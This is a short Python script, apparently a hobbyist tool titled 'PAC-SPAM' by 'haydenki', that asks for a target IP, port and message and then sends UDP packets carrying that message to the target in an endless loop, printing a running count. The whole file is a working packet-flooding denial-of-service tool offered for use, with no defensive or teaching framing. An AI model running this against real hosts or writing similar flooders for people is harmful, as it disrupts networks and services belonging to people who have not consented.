import socket

print("|  __ \ /\   / ____|    / ____|  __ \ /\   |  \/  |")
print("| |__) /  \ | |   _____| (___ | |__) /  \  | \  / |")
print("|  ___/ /\ \| |  |______\___ \|  ___/ /\ \ | |\/| |")
print("| |  / ____ \ |____     ____) | |  / ____ \| |  | |")
print("|_| /_/    \_\_____|   |_____/|_| /_/    \_\_|  |_|")
print("Written by haydenki")
                                                    
                                                    
IP = input("IP:")
PORT = int(input("PORT:"))
MESSAGE = input("MESSAGE:")
count = 0

print("IP = ", IP , "\nPORT = ", PORT, "\nMESSAGE = ", MESSAGE)

while(True):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(bytes(MESSAGE, "utf-8"), (IP, PORT))
		count += 1
		print("[" + str(count) + "] packets sent")
	except:
		print("Error")
